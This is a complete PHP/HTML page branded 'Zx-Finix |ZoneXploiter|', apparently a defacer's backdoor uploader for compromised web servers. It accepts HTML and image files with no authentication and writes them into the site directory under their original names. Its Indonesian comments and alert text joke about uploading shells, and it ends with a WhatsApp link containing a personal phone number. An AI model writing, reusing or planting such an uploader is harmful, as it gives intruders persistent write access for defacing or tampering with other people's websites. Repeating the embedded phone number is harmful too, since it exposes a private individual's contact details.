 <center>
	<h3>Zx-Finix |ZoneXploiter| </h3><br>
<form method="post" enctype="multipart/form-data">
<input type="file" name="file">
<br>
<button name="gas">up!</button>
<?php

if(isset($_POST['gas'])){
	
	//copyright by botline
	//jangan ganti copyright
	//uploader html

$nama = $_FILES['file']['name'];
$gagal = $_FILES['file']['error'];
   $tmp = $_FILES['file']['tmp_name'];
		
		$ext = ['html', 'jpg', 'jpeg', 'png'];
		$extg = explode('.', $nama);
		$extg = strtolower(end($extg));
		if ( !in_array($extg, $ext)) {
		  echo "<script>alert('MAU APLOD SHELL YA BILANG Zx-Finix Gan's Doeloe)</script>";
		return false;
		}
	
	$up = move_uploaded_file($tmp, $nama);
	
	if ($up){
		echo "<br><br>sukses";
		}else{
		echo "<br><br>gagal";
		
	}
}
?>
<font color="lime">Contact me?<a href="https://api.whatsapp.com/send?phone=+6281325130369&text=*Assalamualaikum Zx-Finix Kamu Gan's Deh"><br><font color="white">Click This Gan</font>
